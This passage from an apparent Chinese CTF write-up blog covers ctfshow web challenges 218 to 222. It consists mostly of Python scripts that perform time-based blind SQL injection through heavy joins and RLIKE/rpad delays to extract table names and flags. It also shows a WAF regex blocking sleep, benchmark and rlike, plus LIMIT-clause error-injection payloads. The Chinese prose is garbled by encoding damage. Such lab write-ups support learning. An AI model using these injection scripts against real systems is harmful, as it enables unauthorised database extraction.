class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://f277bdb1-e417-43a9-a241-8a77c0cdaeff.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxc&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaac) from ctfshow_flagxc),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># çœ‹äº†Y4tackerä½¬çš„wpï¼Œçœ‹åˆ°è¿™ç§å†™æ³•ï¼Œè§‰å¾—å¤ªå¦™äº†ã€‚ç”¨tryæ¥å¾®è°ƒ</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="Rlike"><a href="#Rlike" class="headerlink" title="Rlike"></a>Rlike</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">select rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¯­æ³•ï¼š</span><br><span class="line">. : åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</span><br><span class="line">* ï¼š åŒ¹é…<span class="number">0</span>ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå¾—åˆ°çš„å­—ç¬¦</span><br><span class="line">[] : åŒ¹é…ä»»æ„ä¸€ä¸ª[]å†…çš„å­—ç¬¦ï¼Œ[ab]*å¯åŒ¹é…ç©ºä¸²ã€aã€bã€æˆ–è€…ç”±ä»»æ„ä¸ªaå’Œbç»„æˆçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">^ : åŒ¹é…å¼€å¤´ï¼Œå¦‚^såŒ¹é…ä»¥sæˆ–è€…Så¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">$ : åŒ¹é…ç»“å°¾ï¼Œå¦‚s$åŒ¹é…ä»¥sç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">&#123;n&#125; : åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦åå¤næ¬¡ã€‚</span><br><span class="line"></span><br><span class="line">RPAD(<span class="built_in">str</span>,<span class="built_in">len</span>,padstr)</span><br><span class="line">ç”¨å­—ç¬¦ä¸² padstrå¯¹ <span class="built_in">str</span>è¿›è¡Œå³è¾¹å¡«è¡¥ç›´è‡³å®ƒçš„é•¿åº¦è¾¾åˆ° <span class="built_in">len</span>ä¸ªå­—ç¬¦é•¿åº¦ï¼Œç„¶åè¿”å› <span class="built_in">str</span>ã€‚å¦‚æœ <span class="built_in">str</span>çš„é•¿åº¦é•¿äº <span class="built_in">len</span><span class="string">&#x27;ï¼Œé‚£ä¹ˆå®ƒå°†è¢«æˆªé™¤åˆ° lenä¸ªå­—ç¬¦ã€‚</span></span><br><span class="line"><span class="string">mysql&gt; SELECT RPAD(&#x27;</span>hi<span class="string">&#x27;,5,&#x27;</span>?<span class="string">&#x27;); -&gt; &#x27;</span>hi???<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">repeat(str,times)  å¤åˆ¶å­—ç¬¦ä¸²timesæ¬¡</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:å­¤æ¡œæ‡¶å¥‘</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">&quot;concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,ï¼Œ&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#x27;c&#x27;,( concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;),0)#</span></span><br><span class="line"><span class="comment">#æ±‚è¡¨payload = &quot;1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(i,j,bypass),</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.4</span> <span class="keyword">and</span> end - start &lt; <span class="number">1</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] å¼€å§‹ç›²æ³¨ç¬¬&#123;&#125;ä½&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//æŸ¥è¯¢è¯­å¥</span><br><span class="line">where <span class="built_in">id</span> = ($<span class="built_in">id</span>);</span><br><span class="line">//å±è”½å±é™©åˆ†å­</span><br><span class="line">function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/sleep|benchmark|rlike/i&#x27;</span>,$<span class="built_in">str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>åŒä¸Šé¢˜<br>ç›´æ¥è·‘å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://6c19b909-06f4-412b-ba28-581287b784fc.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxca&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flagxca),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># çœ‹äº†Y4tackerä½¬çš„wpï¼Œçœ‹åˆ°è¿™ç§å†™æ³•ï¼Œè§‰å¾—å¤ªå¦™äº†ã€‚ç”¨tryæ¥å¾®è°ƒ</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p>æœ€åä¸€ä¸ªç›²æ³¨äº†ï¼Œèµ¶ç´§åšå®Œèµ¶ç´§æ¶¦ã€‚<br>è¿‡æ»¤äº†substrï¼Œå¯ä»¥ç”¨æ­£åˆ™ï¼Œleftéƒ½å¯ä»¥ã€‚ç”¨limitä»£æ›¿group_concat() </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 13:25   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://2db91241-b5ab-4eec-9035-df2df4f18a46.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select table_name from information_schema.tables where table_schema = database() limit 0,1&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select column_name from information_schema.columns where table_name = &quot;ctfshow_flagxcac&quot; limit 1,1&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select flagaabcc from ctfshow_flagxcac&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(left((&#123;&#125;),&#123;&#125;)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, res + j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>å…¶ä»–è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:å­¤æ¡œæ‡¶å¥‘</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">&quot;select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,ï¼Œ&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#1) and if((database())regexp(&#x27;^ctfshow&#x27;),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)#</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((database())regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((select table_name from information_schema.tables where table_schema=database() limit 0,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and if((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp(&#x27;^&#123;&#125;&#x27;),(&#123;&#125;),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(flag + j,bypass),</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] å¼€å§‹ç›²æ³¨ç¬¬&#123;&#125;ä½&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><blockquote><p><a href="https://www.jb51.net/article/99980.htm"><strong>https://www.jb51.net/article/99980.htm</strong></a></p></blockquote><h3 id="limitæ³¨å…¥-MySQLåˆ©ç”¨procedure-analyse-å‡½æ•°ä¼˜åŒ–è¡¨ç»“æ„-è¿™ä¸ªé¢˜æœ¬è´¨å°±æ˜¯æŠ¥é”™æ³¨å…¥"><a href="#limitæ³¨å…¥-MySQLåˆ©ç”¨procedure-analyse-å‡½æ•°ä¼˜åŒ–è¡¨ç»“æ„-è¿™ä¸ªé¢˜æœ¬è´¨å°±æ˜¯æŠ¥é”™æ³¨å…¥" class="headerlink" title="limitæ³¨å…¥ MySQLåˆ©ç”¨procedure analyse()å‡½æ•°ä¼˜åŒ–è¡¨ç»“æ„ è¿™ä¸ªé¢˜æœ¬è´¨å°±æ˜¯æŠ¥é”™æ³¨å…¥"></a>limitæ³¨å…¥ MySQLåˆ©ç”¨procedure analyse()å‡½æ•°ä¼˜åŒ–è¡¨ç»“æ„ è¿™ä¸ªé¢˜æœ¬è´¨å°±æ˜¯æŠ¥é”™æ³¨å…¥</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * <span class="keyword">from</span> ctfshow_user limit ($page-<span class="number">1</span>)*$limit,$limit;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹åœ¨getå¤„ï¼Œlimitæ³¨å…¥ä½¿ç”¨æ ‡å‡†ï¼š<br><code>select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code><br>ä¿®æ”¹ä¸ºpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=<span class="number">1</span>&amp;limit=<span class="number">1</span> procedure analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689329494340-363ae1db-f3a1-4694-9bad-d0ec6cc660b7.png" alt="image.png"><br>ç›´æ¥äº¤æ•°æ®åº“åå³å¯</p><h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h3 id="group-byæ³¨å…¥"><a href="#group-byæ³¨å…¥" class="headerlink" title="group byæ³¨å…¥"></a>group byæ³¨å…¥</h3><p>ç›´æ¥åœ¨group byçš„ä½ç½®æ³¨å…¥å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 